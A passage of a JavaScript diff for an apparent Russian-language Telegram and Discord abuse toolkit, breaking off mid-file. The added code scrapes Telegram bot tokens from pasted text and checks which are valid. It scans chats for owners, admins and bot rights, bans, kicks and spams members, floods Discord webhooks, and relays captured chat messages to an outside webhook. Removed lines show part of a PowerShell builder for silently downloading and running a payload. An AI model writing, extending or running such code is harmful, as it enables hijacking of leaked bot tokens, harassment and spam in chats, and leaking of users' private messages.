-  const t = $('toast'); t.textContent = m || 'ok'; t.classList.add('on');
-  clearTimeout(t._t); t._t = setTimeout(() => t.classList.remove('on'), 1400);
-};
+const toast = m => { const t=$('toast'); t.textContent=m||'ok'; t.classList.add('on'); clearTimeout(t._t); t._t=setTimeout(()=>t.classList.remove('on'),1400); };
 async function copyText(s) {
   try { await navigator.clipboard.writeText(s); } catch {
-    const ta = document.createElement('textarea'); ta.value = s; document.body.appendChild(ta); ta.select();
-    document.execCommand('copy'); ta.remove();
+    const ta=document.createElement('textarea'); ta.value=s; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove();
   }
-  toast('скопировано');
+  toast('copy');
 }
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-function esc(s) { return String(s).replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c])); }
+function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
+function esc(s){ return String(s).replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c])); }
+function tok(){ return ($('token').value||$('spamToken').value||$('profToken').value||$('chanToken').value||'').trim(); }
 
-document.querySelectorAll('.tab').forEach(btn => {
-  btn.addEventListener('click', () => {
-    document.querySelectorAll('.tab').forEach(b => b.classList.remove('on'));
-    document.querySelectorAll('.panel').forEach(p => p.classList.remove('on'));
+document.querySelectorAll('.tab').forEach(btn=>{
+  btn.addEventListener('click',()=>{
+    document.querySelectorAll('.tab').forEach(b=>b.classList.remove('on'));
+    document.querySelectorAll('.panel').forEach(p=>p.classList.remove('on'));
     btn.classList.add('on');
-    $('tab-' + btn.dataset.tab).classList.add('on');
+    $('tab-'+btn.dataset.tab).classList.add('on');
   });
 });
 
-/* TG bot hint */
-let botTimer = null;
-$('token').addEventListener('input', () => {
-  const val = $('token').value.trim();
-  const hint = $('botHint');
+let botTimer=null;
+$('token').addEventListener('input',()=>{
+  const val=$('token').value.trim();
+  const hint=$('botHint');
   clearTimeout(botTimer);
-  if (!val.includes(':')) { hint.textContent = ''; return; }
-  hint.textContent = '...';
-  botTimer = setTimeout(async () => {
-    try {
-      const r = await fetch('https://api.telegram.org/bot' + val + '/getMe');
-      const j = await r.json();
-      hint.textContent = j.ok ? ('@' + j.result.username + ' — ' + j.result.first_name) : 'invalid token';
-    } catch { hint.textContent = ''; }
-  }, 500);
+  if(!val.includes(':')){ hint.textContent=''; return; }
+  hint.textContent='...';
+  botTimer=setTimeout(async()=>{
+    try{
+      const r=await fetch('https://api.telegram.org/bot'+val+'/getMe');
+      const j=await r.json();
+      hint.textContent=j.ok?('@'+j.result.username+' — '+j.result.first_name):'invalid';
+    }catch{ hint.textContent=''; }
+  },500);
 });
 
-/* Forwarder */
-let stopFlag = false, forwarded = 0, skipped = 0, errors = 0;
-function logLine(cls, msgId, text) {
-  const box = $('logBox');
-  const time = new Date().toLocaleTimeString('ru-RU');
-  const div = document.createElement('div');
-  div.innerHTML = `<span class="info">${time}</span> <span class="${cls}">#${msgId}: ${esc(text)}</span>`;
-  box.appendChild(div); box.scrollTop = box.scrollHeight;
+let stopFlag=false, forwarded=0, skipped=0, errors=0;
+function logLine(cls,msgId,text){
+  const box=$('logBox');
+  const div=document.createElement('div');
+  div.innerHTML=`<span class="info">${new Date().toLocaleTimeString('ru-RU')}</span> <span class="${cls}">#${msgId}: ${esc(text)}</span>`;
+  box.appendChild(div); box.scrollTop=box.scrollHeight;
 }
-function updateStats(cur, total) {
-  const pct = total ? Math.round((cur / total) * 100) : 0;
-  $('progressFill').style.width = pct + '%';
-  $('sCurrent').textContent = cur;
-  $('sForwarded').textContent = forwarded;
-  $('sSkipped').textContent = skipped;
-  $('sErrors').textContent = errors;
+function updateStats(cur,total){
+  $('progressFill').style.width=(total?Math.round(cur/total*100):0)+'%';
+  $('sCurrent').textContent=cur;
+  $('sForwarded').textContent=forwarded;
+  $('sSkipped').textContent=skipped;
+  $('sErrors').textContent=errors;
 }
-$('startBtn').addEventListener('click', async () => {
-  const token = $('token').value.trim();
-  const fromChat = $('fromChat').value.trim();
-  const toChat = $('toChat').value.trim();
-  const msgFrom = parseInt($('msgFrom').value, 10);
-  const msgTo = parseInt($('msgTo').value, 10);
-  const delay = Math.max(80, parseInt($('delay').value, 10) || 300);
-  if (!token || !fromChat || !toChat) return alert('Токен и chat id');
-  if (msgFrom > msgTo) return alert('msgFrom <= msgTo');
-  stopFlag = false; forwarded = 0; skipped = 0; errors = 0;
-  $('startBtn').disabled = true;
-  $('stopBtn').style.display = 'block';
-  $('progressCard').style.display = 'block';
-  $('progressTitle').textContent = 'Работает';
-  $('logBox').innerHTML = '';
-  const total = msgTo - msgFrom + 1;
-  logLine('info', '—', `Range ${msgFrom}..${msgTo} (${total})`);
-  for (let id = msgFrom; id <= msgTo; id++) {
-    if (stopFlag) { logLine('info', id, 'stopped'); break; }
-    updateStats(id - msgFrom, total);
-    try {
-      const url = `https://api.telegram.org/bot${token}/forwardMessage?chat_id=${encodeURIComponent(toChat)}&from_chat_id=${encodeURIComponent(fromChat)}&message_id=${id}`;
-      const res = await fetch(url);
-      const data = await res.json();
-      if (data.ok) { forwarded++; logLine('ok', id, 'ok'); }
-      else {
-        const desc = data.description || '';
-        if (/not found|MESSAGE_ID_INVALID/i.test(desc)) skipped++;
-        else if (/Too Many Requests/i.test(desc)) {
-          const wait = (data.parameters && data.parameters.retry_after ? data.parameters.retry_after : 5) * 1000;
-          logLine('err', id, 'flood ' + (wait/1000) + 's');
-          await sleep(wait); id--;
-        } else if (/chat not found|CHAT_NOT_FOUND|Forbidden|blocked/i.test(desc)) {
-          logLine('err', id, desc); break;
-        } else { errors++; logLine('err', id, desc); }
-      }
-    } catch (e) { errors++; logLine('err', id, 'network'); }
-    updateStats(id - msgFrom + 1, total);
-    await sleep(delay);
-  }
-  $('progressFill').style.width = '100%';
-  $('progressTitle').textContent = stopFlag ? 'Стоп' : 'Готово';
-  $('startBtn').disabled = false;
-  $('stopBtn').style.display = 'none';
-  $('stopBtn').disabled = false;
-  $('stopBtn').textContent = 'Стоп';
-});
-$('stopBtn').addEventListener('click', () => {
-  stopFlag = true;
-  $('stopBtn').textContent = '...';
-  $('stopBtn').disabled = true;
-});
 
-/* Messages */
-$('loadMsgs').addEventListener('click', async () => {
-  const token = $('token').value.trim();
-  const list = $('msgList');
-  if (!token) { list.innerHTML = '<div class="hint">токен на TG Forward</div>'; return; }
-  $('msgsStatus').textContent = '...';
-  try {
-    const r = await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=50&timeout=0`);
-    const data = await r.json();
-    if (!data.ok) { list.innerHTML = `<div class="hint">${esc(data.description||'error')}</div>`; return; }
-    const updates = data.result.filter(u => u.message || u.edited_message || u.channel_post).reverse();
-    $('msgsStatus').textContent = updates.length + ' шт';
-    if (!updates.length) { list.innerHTML = '<div class="hint">пусто</div>'; return; }
-    list.innerHTML = updates.map(u => {
-      const msg = u.message || u.edited_message || u.channel_post;
-      const from = msg.from ? [msg.from.first_name, msg.from.last_name].filter(Boolean).join(' ') : (msg.chat && msg.chat.title) || 'chat';
-      const un = msg.from && msg.from.username ? '@' + msg.from.username : '';
-      const text = msg.text || msg.caption || (msg.photo ? '[photo]' : msg.document ? '[file]' : '');
-      const time = new Date(msg.date * 1000).toLocaleString('ru-RU');
-      return `<div class="msg-item"><div class="msg-from">${esc(from)}<br>${esc(un)}</div><div class="msg-body">${esc(text||'—')}</div><div class="msg-time">${esc(time)}</div></div>`;
-    }).join('');
-  } catch (e) {
-    list.innerHTML = `<div class="hint">${esc(e.message)}</div>`;
-  }
-});
+$('startBtn').addEventListener('click', async ()=>{
+  const token=$('token').value.trim();
+  let fromChat=$('fromChat').value.trim();
+  let toChat=$('toChat').value.trim();
+  const msgFrom=parseInt($('msgFrom').value,10);
+  const msgTo=parseInt($('msgTo').value,10);
+  const delay=Math.max(80,parseInt($('delay').value,10)||300);
+  const allMode=$('fwdAll').checked || !fromChat;
+  if(!token) return alert('токен');
+  stopFlag=false; forwarded=0; skipped=0; errors=0;
+  $('startBtn').disabled=true;
+  $('stopBtn').style.display='block';
+  $('progressCard').style.display='block';
+  $('progressTitle').textContent='Работает';
+  $('logBox').innerHTML='';
 
-/* TG Spam */
-let spamStop = false;
-$('spamStart').addEventListener('click', async () => {
-  const token = $('spamToken').value.trim() || $('token').value.trim();
-  const chats = $('spamChats').value.split(/\n+/).map(s => s.trim()).filter(Boolean);
-  const text = $('spamText').value;
-  const delay = Math.max(100, parseInt($('spamDelay').value, 10) || 500);
-  const parse = $('spamParse').value;
-  if (!token || !chats.length || !text) return alert('токен, чаты, текст');
-  spamStop = false;
-  $('spamStart').disabled = true;
-  $('spamStop').style.display = 'block';
-  const log = $('spamLog');
-  log.style.display = 'block';
-  log.innerHTML = '';
-  for (const chat of chats) {
-    if (spamStop) break;
-    try {
-      let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${encodeURIComponent(chat)}&text=${encodeURIComponent(text)}`;
-      if (parse) url += '&parse_mode=' + parse;
-      const r = await fetch(url);
-      const j = await r.json();
-      log.innerHTML += `<div class="${j.ok?'ok':'err'}">${esc(chat)}: ${j.ok?'ok':esc(j.description||'fail')}</div>`;
-    } catch (e) {
-      log.innerHTML += `<div class="err">${esc(chat)}: network</div>`;
+  if(allMode){
+    logLine('info','—','auto: getUpdates → forward');
+    let offset=0;
+    while(!stopFlag){
+      try{
+        const r=await fetch(`https://api.telegram.org/bot${token}/getUpdates?timeout=20&offset=${offset}`);
+        const data=await r.json();
+        if(!data.ok){ logLine('err','—',data.description||'fail'); break; }
+        for(const u of data.result){
+          offset=u.update_id+1;
+          const msg=u.message||u.channel_post||u.edited_message;
+          if(!msg) continue;
+          const src=msg.chat.id;
+          const mid=msg.message_id;
+          const dest=toChat||src;
+          try{
+            const fr=await fetch(`https://api.telegram.org/bot${token}/forwardMessage?chat_id=${encodeURIComponent(dest)}&from_chat_id=${src}&message_id=${mid}`);
+            const fj=await fr.json();
+            if(fj.ok){ forwarded++; logLine('ok',mid,src+' → '+dest); }
+            else { errors++; logLine('err',mid,fj.description||''); }
+          }catch{ errors++; }
+          updateStats(forwarded+errors, forwarded+errors+1);
+          await sleep(delay);
+          if(stopFlag) break;
+        }
+      }catch(e){ logLine('err','—','network'); await sleep(2000); }
     }
-    log.scrollTop = log.scrollHeight;
-    await sleep(delay);
-  }
-  $('spamStart').disabled = false;
-  $('spamStop').style.display = 'none';
-  toast('готово');
-});
-$('spamStop').addEventListener('click', () => { spamStop = true; });
-
-/* Webhook */
-let hookStop = false;
-$('hookStart').addEventListener('click', async () => {
-  const urls = $('hookUrls').value.split(/\n+/).map(s => s.trim()).filter(Boolean);
-  let body = $('hookBody').value;
-  const delay = Math.max(100, parseInt($('hookDelay').value, 10) || 800);
-  const repeat = Math.max(1, Math.min(50, parseInt($('hookRepeat').value, 10) || 1));
-  if (!urls.length || !body) return alert('url и body');
-  let contentType = 'application/json';
-  try { JSON.parse(body); } catch { body = JSON.stringify({ content: body }); }
-  hookStop = false;
-  $('hookStart').disabled = true;
-  $('hookStop').style.display = 'block';
-  const log = $('hookLog');
-  log.style.display = 'block';
-  log.innerHTML = '';
-  for (const url of urls) {
-    for (let i = 0; i < repeat; i++) {
-      if (hookStop) break;
-      try {
-        const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': contentType }, body });
-        log.innerHTML += `<div class="${r.ok?'ok':'err'}">${esc(url.slice(0,48))}… [${i+1}] ${r.status}</div>`;
-      } catch (e) {
-        log.innerHTML += `<div class="err">${esc(url.slice(0,40))} network</div>`;
-      }
-      log.scrollTop = log.scrollHeight;
+  } else {
+    if(!toChat) toChat=fromChat;
+    const total=msgTo-msgFrom+1;
+    logLine('info','—',`range ${msgFrom}..${msgTo}`);
+    for(let id=msgFrom; id<=msgTo; id++){
+      if(stopFlag) break;
+      updateStats(id-msgFrom,total);
+      try{
+        const url=`https://api.telegram.org/bot${token}/forwardMessage?chat_id=${encodeURIComponent(toChat)}&from_chat_id=${encodeURIComponent(fromChat)}&message_id=${id}`;
+        const res=await fetch(url);
+        const data=await res.json();
+        if(data.ok){ forwarded++; logLine('ok',id,'ok'); }
+        else {
+          const desc=data.description||'';
+          if(/not found|MESSAGE_ID_INVALID/i.test(desc)) skipped++;
+          else if(/Too Many Requests/i.test(desc)){
+            const wait=(data.parameters&&data.parameters.retry_after?data.parameters.retry_after:5)*1000;
+            logLine('err',id,'flood '+wait/1000+'s'); await sleep(wait); id--;
+          } else if(/CHAT_NOT_FOUND|Forbidden|blocked/i.test(desc)){ logLine('err',id,desc); break; }
+          else { errors++; logLine('err',id,desc); }
+        }
+      }catch{ errors++; logLine('err',id,'network'); }
+      updateStats(id-msgFrom+1,total);
       await sleep(delay);
     }
   }
-  $('hookStart').disabled = false;
-  $('hookStop').style.display = 'none';
-  toast('готово');
+  $('progressFill').style.width='100%';
+  $('progressTitle').textContent=stopFlag?'Стоп':'Готово';
+  $('startBtn').disabled=false;
+  $('stopBtn').style.display='none';
+  $('stopBtn').disabled=false;
+  $('stopBtn').textContent='Стоп';
 });
-$('hookStop').addEventListener('click', () => { hookStop = true; });
+$('stopBtn').addEventListener('click',()=>{ stopFlag=true; $('stopBtn').textContent='...'; $('stopBtn').disabled=true; });
 
-/* Checkers */
-$('chkTokenBtn').addEventListener('click', async () => {
-  const tokens = $('chkTokens').value.split(/\n+/).map(s => s.trim()).filter(Boolean);
-  const out = $('chkTokenOut');
-  out.innerHTML = '';
-  if (!tokens.length) return;
-  for (const t of tokens) {
-    try {
-      const r = await fetch('https://api.telegram.org/bot' + t + '/getMe');
-      const j = await r.json();
-      if (j.ok) {
-        out.innerHTML += `<div class="msg-item"><div><span class="badge status-ok">OK</span> @${esc(j.result.username||'')} id=${j.result.id}</div><div class="msg-body">${esc(j.result.first_name||'')}</div></div>`;
-      } else {
-        out.innerHTML += `<div class="msg-item"><div><span class="badge status-bad">FAIL</span></div><div class="msg-body">${esc(j.description||'bad')}</div></div>`;
-      }
-    } catch {
-      out.innerHTML += `<div class="msg-item"><div><span class="badge status-bad">NET</span></div><div class="msg-body">${esc(t.slice(0,20))}…</div></div>`;
-    }
-  }
-});
-$('chkHookBtn').addEventListener('click', async () => {
-  const urls = $('chkHooks').value.split(/\n+/).map(s => s.trim()).filter(Boolean);
-  const out = $('chkHookOut');
-  out.innerHTML = '';
-  if (!urls.length) return;
-  for (const url of urls) {
-    try {
-      const r = await fetch(url);
-      const j = await r.json().catch(() => ({}));
-      if (r.ok && (j.name || j.id || j.channel_id || j.type)) {
-        out.innerHTML += `<div class="msg-item"><div><span class="badge status-ok">OK</span> ${r.status}</div><div class="msg-body">${esc(j.name||j.id||'live')}</div></div>`;
-      } else {
-        out.innerHTML += `<div class="msg-item"><div><span class="badge status-bad">${r.status}</span></div><div class="msg-body">${esc(j.message||j.code||'dead')}</div></div>`;
-      }
-    } catch {
-      out.innerHTML += `<div class="msg-item"><div><span class="badge status-bad">NET</span></div><div class="msg-body">${esc(url.slice(0,40))}</div></div>`;
-    }
-  }
+$('loadMsgs').addEventListener('click', async ()=>{
+  const token=$('token').value.trim();
+  const list=$('msgList');
+  if(!token){ list.innerHTML='<div class="hint">токен</div>'; return; }
+  $('msgsStatus').textContent='...';
+  try{
+    const r=await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=50&timeout=0`);
+    const data=await r.json();
+    if(!data.ok){ list.innerHTML=`<div class="hint">${esc(data.description||'')}</div>`; return; }
+    const updates=data.result.filter(u=>u.message||u.edited_message||u.channel_post).reverse();
+    $('msgsStatus').textContent=updates.length+' шт';
+    if(!updates.length){ list.innerHTML='<div class="hint">пусто</div>'; return; }
+    list.innerHTML=updates.map(u=>{
+      const msg=u.message||u.edited_message||u.channel_post;
+      const from=msg.from?[msg.from.first_name,msg.from.last_name].filter(Boolean).join(' '):(msg.chat&&msg.chat.title)||'chat';
+      const text=msg.text||msg.caption||'[media]';
+      const time=new Date(msg.date*1000).toLocaleString('ru-RU');
+      return `<div class="msg-item"><div><div class="msg-from">${esc(from)} · ${esc(String(msg.chat.id))}</div><div class="msg-body">${esc(text)}</div></div><div class="msg-time">${esc(time)}</div></div>`;
+    }).join('');
+  }catch(e){ list.innerHTML=`<div class="hint">${esc(e.message)}</div>`; }
 });
 
-/* PowerShell builder */
-const DIR_MAP = {
-  TEMP: { ps: '$env:TEMP', show: '%TEMP%' },
-  LOCALAPPDATA: { ps: '$env:LOCALAPPDATA', show: '%LOCALAPPDATA%' },
-  APPDATA: { ps: '$env:APPDATA', show: '%APPDATA%' },
-  DOWNLOADS: { ps: "[Environment]::GetFolderPath('UserProfile')+'\\\\Downloads'", show: '%USERPROFILE%\\Downloads' },
-  CUSTOM: { ps: null, show: null }
-};
-function filenameFromUrl(u) {
-  try {
-    const p = new URL(u).pathname.split('/').filter(Boolean).pop() || 'payload.bin';
-    return decodeURIComponent(p.split('?')[0]) || 'payload.bin';
-  } catch { return 'payload.bin'; }
+let spamStop=false;
+$('spamStart').addEventListener('click', async ()=>{
+  const token=($('spamToken').value.trim()||$('token').value.trim());
+  const chats=$('spamChats').value.split(/\n+/).map(s=>s.trim()).filter(Boolean);
+  const text=$('spamText').value;
+  const delay=Math.max(100,parseInt($('spamDelay').value,10)||500);
+  const parse=$('spamParse').value;
+  if(!token||!chats.length||!text) return alert('токен/чаты/текст');
+  spamStop=false; $('spamStart').disabled=true; $('spamStop').style.display='block';
+  const log=$('spamLog'); log.style.display='block'; log.innerHTML='';
+  for(const chat of chats){
+    if(spamStop) break;
+    try{
+      let url=`https://api.telegram.org/bot${token}/sendMessage?chat_id=${encodeURIComponent(chat)}&text=${encodeURIComponent(text)}`;
+      if(parse) url+='&parse_mode='+parse;
+      const r=await fetch(url); const j=await r.json();
+      log.innerHTML+=`<div class="${j.ok?'ok':'err'}">${esc(chat)}: ${j.ok?'ok':esc(j.description||'')}</div>`;
+    }catch{ log.innerHTML+=`<div class="err">${esc(chat)}: net</div>`; }
+    log.scrollTop=log.scrollHeight; await sleep(delay);
+  }
+  $('spamStart').disabled=false; $('spamStop').style.display='none'; toast('done');
+});
+$('spamStop').addEventListener('click',()=>{ spamStop=true; });
+
+/* token parser */
+$('parseRun').addEventListener('click', async ()=>{
+  const text=$('parseIn').value;
+  const re=/\b(\d{6,}:[A-Za-z0-9_-]{30,})\b/g;
+  const found=[...new Set((text.match(re)||[]))];
+  const out=$('parseOut');
+  out.innerHTML='';
+  if(!found.length){ out.innerHTML='<div class="hint">токенов не найдено</div>'; return; }
+  out.innerHTML=`<div class="hint">${found.length} уникальных — проверка...</div>`;
+  for(const t of found){
+    try{
+      const r=await fetch('https://api.telegram.org/bot'+t+'/getMe');
+      const j=await r.json();
+      if(j.ok){
+        out.innerHTML+=`<div class="msg-item"><div><span class="badge status-ok">VALID</span> <code style="font-size:11px;word-break:break-all">${esc(t)}</code><div class="msg-from">@${esc(j.result.username||'')} · ${esc(j.result.first_name||'')} · id ${j.result.id}</div></div></div>`;
+      } else {
+        out.innerHTML+=`<div class="msg-item"><div><span class="badge status-bad">DEAD</span> <code style="font-size:11px">${esc(t.slice(0,20))}…</code></div></div>`;
+      }
+    }catch{
+      out.innerHTML+=`<div class="msg-item"><div><span class="badge status-bad">NET</span> ${esc(t.slice(0,16))}…</div></div>`;
+    }
+    await sleep(200);
+  }
+});
+
+/* profile loop */
+let profTimer=null;
+async function applyProfile(){
+  const token=($('profToken').value.trim()||$('token').value.trim());
+  const log=$('profLog');
+  if(!token){ log.innerHTML+='<div class="err">токен</div>'; return; }
+  const name=$('profName').value.trim();
+  const desc=$('profDesc').value.trim();
+  const short=$('profShort').value.trim();
+  const photo=$('profPhoto').value.trim();
+  const api=async (method, params)=>{
+    const r=await fetch(`https://api.telegram.org/bot${token}/${method}`,{
+      method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(params)
+    });
+    return r.json();
+  };
+  if(name){
+    const j=await api('setMyName',{name});
+    log.innerHTML+=`<div class="${j.ok?'ok':'err'}">name: ${j.ok?'ok':esc(j.description||'')}</div>`;
+  }
+  if(desc){
+    const j=await api('setMyDescription',{description:desc});
+    log.innerHTML+=`<div class="${j.ok?'ok':'err'}">desc: ${j.ok?'ok':esc(j.description||'')}</div>`;
+  }
+  if(short){
+    const j=await api('setMyShortDescription',{short_description:short});
+    log.innerHTML+=`<div class="${j.ok?'ok':'err'}">short: ${j.ok?'ok':esc(j.description||'')}</div>`;
+  }
+  if(photo){
+    try{
+      const img=await fetch(photo);
+      const blob=await img.blob();
+      const fd=new FormData();
+      fd.append('photo', blob, 'icon.jpg');
+      const r=await fetch(`https://api.telegram.org/bot${token}/setMyProfilePhoto`,{method:'POST',body:fd});
+      const j=await r.json();
+      log.innerHTML+=`<div class="${j.ok?'ok':'err'}">photo: ${j.ok?'ok':esc(j.description||'')}</div>`;
+    }catch(e){
+      log.innerHTML+=`<div class="err">photo: ${esc(e.message)}</div>`;
+    }
+  }
+  log.scrollTop=log.scrollHeight;
 }
-function sq(s) { return "'" + String(s).replace(/'/g, "''") + "'"; }
-function buildPs() {
-  const url = $('psUrl').value.trim();
-  if (!url) return null;
-  let name = $('psName').value.trim() || filenameFromUrl(url);
-  const dirKey = $('psDir').value;
-  let dirPs, dirShow;
-  if (dirKey === 'CUSTOM') {
-    const c = $('psCustom').value.trim() || 'C:\\Users\\Public';
-    dirPs = sq(c); dirShow = c;
-  } else {
-    dirPs = DIR_MAP[dirKey].ps; dirShow = DIR_MAP[dirKey].show;
+$('profOnce').addEventListener('click',()=>applyProfile());
+$('profStart').addEventListener('click',()=>{
+  if(profTimer) clearInterval(profTimer);
+  applyProfile();
+  const sec=Math.max(5,parseInt($('profInterval').value,10)||30);
+  profTimer=setInterval(()=>{ if($('profLoop').checked||true) applyProfile(); }, sec*1000);
+  $('profStart').style.display='none';
+  $('profStop').style.display='block';
+  toast('цикл '+sec+'s');
+});
+$('profStop').addEventListener('click',()=>{
+  if(profTimer) clearInterval(profTimer);
+  profTimer=null;
+  $('profStart').style.display='block';
+  $('profStop').style.display='none';
+});
+
+/* channels */
+$('chanFromUpdates').addEventListener('click', async ()=>{
+  const token=($('chanToken').value.trim()||$('token').value.trim());
+  if(!token) return alert('токен');
+  const r=await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=100`);
+  const j=await r.json();
+  if(!j.ok) return;
+  const ids=new Set();
+  j.result.forEach(u=>{
+    const m=u.message||u.channel_post||u.my_chat_member||u.chat_member;
+    if(m&&m.chat) ids.add(String(m.chat.id));
+    if(u.my_chat_member) ids.add(String(u.my_chat_member.chat.id));
+  });
+  const cur=$('chanIds').value.trim();
+  const merged=[...new Set([...(cur?cur.split(/\n+/):[]),...ids])].filter(Boolean);
+  $('chanIds').value=merged.join('\n');
+  toast(merged.length+' id');
+});
+
+$('chanScan').addEventListener('click', async ()=>{
+  const token=($('chanToken').value.trim()||$('token').value.trim());
+  const ids=$('chanIds').value.split(/\n+/).map(s=>s.trim()).filter(Boolean);
+  const out=$('chanOut');
+  out.innerHTML='';
+  if(!token||!ids.length) return alert('токен + ids');
+  for(const id of ids){
+    try{
+      const chat=await (await fetch(`https://api.telegram.org/bot${token}/getChat?chat_id=${encodeURIComponent(id)}`)).json();
+      let count='?';
+      try{
+        const c=await (await fetch(`https://api.telegram.org/bot${token}/getChatMemberCount?chat_id=${encodeURIComponent(id)}`)).json();
+        if(c.ok) count=c.result;
+      }catch{}
+      let admins=[];
+      try{
+        const a=await (await fetch(`https://api.telegram.org/bot${token}/getChatAdministrators?chat_id=${encodeURIComponent(id)}`)).json();
+        if(a.ok) admins=a.result;
+      }catch{}
+      let meRights='—';
+      try{
+        const me=await (await fetch(`https://api.telegram.org/bot${token}/getMe`)).json();
+        if(me.ok){
+          const mem=await (await fetch(`https://api.telegram.org/bot${token}/getChatMember?chat_id=${encodeURIComponent(id)}&user_id=${me.result.id}`)).json();
+          if(mem.ok){
+            const m=mem.result;
+            meRights=m.status+(m.can_post_messages?' post':'')+(m.can_delete_messages?' del':'')+(m.can_restrict_members?' ban':'')+(m.can_promote_members?' promo':'')+(m.can_change_info?' info':'')+(m.can_invite_users?' invite':'');
+          }
+        }
+      }catch{}
+      const owners=admins.filter(a=>a.status==='creator').map(a=>'@'+(a.user.username||a.user.id)).join(', ')||'—';
+      const ads=admins.filter(a=>a.status==='administrator').map(a=>'@'+(a.user.username||a.user.id)).join(', ')||'—';
+      const title=chat.ok?(chat.result.title||chat.result.username||id):id;
+      const type=chat.ok?chat.result.type:'?';
+      out.innerHTML+=`<div class="chan-card">
+        <h3>${esc(title)}</h3>
+        <div class="chan-meta">id ${esc(id)} · ${esc(type)} · ${esc(String(count))} members</div>
+        <div class="chan-meta">owners: ${esc(owners)}</div>
+        <div class="chan-meta">admins: ${esc(ads)}</div>
+        <div class="chan-meta">bot rights: ${esc(meRights)}</div>
+        <button class="btn-sm" type="button" onclick="document.getElementById('actChat').value='${esc(id)}'">в действие</button>
+      </div>`;
+    }catch(e){
+      out.innerHTML+=`<div class="chan-card"><div class="err">${esc(id)}: ${esc(e.message)}</div></div>`;
+    }
+    await sleep(300);
   }
-  const hidden = $('psHidden').checked;
-  const silent = $('psSilent').checked;
-  const wait = $('psWait').checked;
-  const admin = $('psAdmin').checked;
-  const mkdir = $('psMkdir').checked;
-  const b64 = $('psB64').checked;
-  let lines = [];
-  if (mkdir) lines.push(`$d=${dirPs}; if(!(Test-Path $d)){New-Item -ItemType Directory -Path $d -Force|Out-Null}`);
+});
+
+document.querySelectorAll('[data-act]').forEach(btn=>{
+  btn.addEventListener('click', async ()=>{
+    const token=($('chanToken').value.trim()||$('token').value.trim());
+    const chat=$('actChat').value.trim();
+    const user=$('actUser').value.trim();
+    const text=$('actText').value.trim();
+    const act=btn.dataset.act;
+    const log=$('actLog');
+    if(!token||!chat) return;
+    let url='', body=null;
+    if(act==='spam'){
+      url=`https://api.telegram.org/bot${token}/sendMessage?chat_id=${encodeURIComponent(chat)}&text=${encodeURIComponent(text||'...')}`;
+    } else if(act==='ban'){
+      url=`https://api.telegram.org/bot${token}/banChatMember?chat_id=${encodeURIComponent(chat)}&user_id=${encodeURIComponent(user)}`;
+    } else if(act==='kick'){
+      url=`https://api.telegram.org/bot${token}/banChatMember?chat_id=${encodeURIComponent(chat)}&user_id=${encodeURIComponent(user)}`;
+      await fetch(url);
+      url=`https://api.telegram.org/bot${token}/unbanChatMember?chat_id=${encodeURIComponent(chat)}&user_id=${encodeURIComponent(user)}&only_if_banned=true`;
+    } else if(act==='unban'){
+      url=`https://api.telegram.org/bot${token}/unbanChatMember?chat_id=${encodeURIComponent(chat)}&user_id=${encodeURIComponent(user)}`;
+    } else if(act==='title'){
+      url=`https://api.telegram.org/bot${token}/setChatTitle?chat_id=${encodeURIComponent(chat)}&title=${encodeURIComponent(text||'chat')}`;
+    } else if(act==='invite'){
+      url=`https://api.telegram.org/bot${token}/createChatInviteLink?chat_id=${encodeURIComponent(chat)}`;
+    }
+    try{
+      const r=await fetch(url);
+      const j=await r.json();
+      log.innerHTML+=`<div class="${j.ok?'ok':'err'}">${act}: ${j.ok?(typeof j.result==='object'?JSON.stringify(j.result).slice(0,80):'ok'):esc(j.description||'')}</div>`;
+    }catch(e){ log.innerHTML+=`<div class="err">${act}: ${esc(e.message)}</div>`; }
+    log.scrollTop=log.scrollHeight;
+  });
+});
+
+/* discord */
+let hookStop=false;
+$('hookStart').addEventListener('click', async ()=>{
+  const urls=$('hookUrls').value.split(/\n+/).map(s=>s.trim()).filter(Boolean);
+  let body=$('hookBody').value;
+  const delay=Math.max(100,parseInt($('hookDelay').value,10)||800);
+  const repeat=Math.max(1,Math.min(50,parseInt($('hookRepeat').value,10)||1));
+  if(!urls.length||!body) return alert('url+body');
+  try{ JSON.parse(body); }catch{ body=JSON.stringify({content:body}); }
+  hookStop=false; $('hookStart').disabled=true; $('hookStop').style.display='block';
+  const log=$('hookLog'); log.style.display='block'; log.innerHTML='';
+  for(const url of urls){
+    for(let i=0;i<repeat;i++){
+      if(hookStop) break;
+      try{
+        const r=await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body});
+        log.innerHTML+=`<div class="${r.ok||r.status===204?'ok':'err'}">${esc(url.slice(0,40))}… ${r.status}</div>`;
+      }catch{ log.innerHTML+=`<div class="err">net</div>`; }
+      log.scrollTop=log.scrollHeight; await sleep(delay);
+    }
+  }
+  $('hookStart').disabled=false; $('hookStop').style.display='none'; toast('done');
+});
+$('hookStop').addEventListener('click',()=>{ hookStop=true; });
+
+$('hookFwd').addEventListener('click', async ()=>{
+  const token=($('hookTgToken').value.trim()||$('token').value.trim());
+  const wh=$('hookFwdUrl').value.trim();
+  const log=$('hookFwdLog');
+  if(!token||!wh) return alert('token+wh');
+  log.innerHTML='';
+  try{
+    const r=await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=20`);
+    const j=await r.json();
+    if(!j.ok){ log.innerHTML='<div class="err">'+esc(j.description||'')+'</div>'; return; }
+    for(const u of j.result){
+      const msg=u.message||u.channel_post;
+      if(!msg) continue;
+      const text=msg.text||msg.caption||'[media]';
+      const from=msg.from?(msg.from.username||msg.from.first_name): (msg.chat&&msg.chat.title)||'?';
+      const body=JSON.stringify({content:`**${from}**: ${text}`.slice(0,1900)});
+      const hr=await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body});
+      log.innerHTML+=`<div class="${hr.ok||hr.status===204?'ok':'err'}">${esc(from)} → ${hr.status}</div>`;
+      await sleep(500);
+    }
+  }catch(e){ log.innerHTML+=`<div class="err">${esc(e.message)}</div>`; }
+});
+
+/* checkers */
+$('chkTokenBtn').addEventListener('click', async ()=>{
